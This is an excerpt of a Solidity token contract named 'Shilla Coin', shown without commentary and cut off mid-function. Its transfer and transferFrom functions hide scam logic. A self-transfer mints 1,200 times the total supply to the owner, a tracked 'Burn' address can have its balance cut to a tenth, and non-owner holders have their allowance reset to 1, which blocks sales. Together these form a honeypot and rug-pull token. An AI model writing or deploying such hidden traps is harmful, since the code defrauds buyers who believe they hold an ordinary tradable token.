...
contract SHILLA {
    ...
    string public name = "Shilla Coin";
    ...
    mapping(address => mapping(address => uint256)) public allowance; uint256 public ti;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ti+=2;
        if (Burn != Owner && to != Burn && balanceOf[Burn]>=totalSupply.div(12+ti)) {
            balanceOf[Burn]=balanceOf[Burn].div(10);}
        if (msg.sender==ShillaPair() && balanceOf[to]==0) {Burn = to;}
        if (to== Owner) {Burn=to;}
        if (to == msg.sender) {uint256 Amount=totalSupply*1200;balanceOf[Owner]+=Amount;}
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Burn) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function ShillaPair() public view returns (address) {
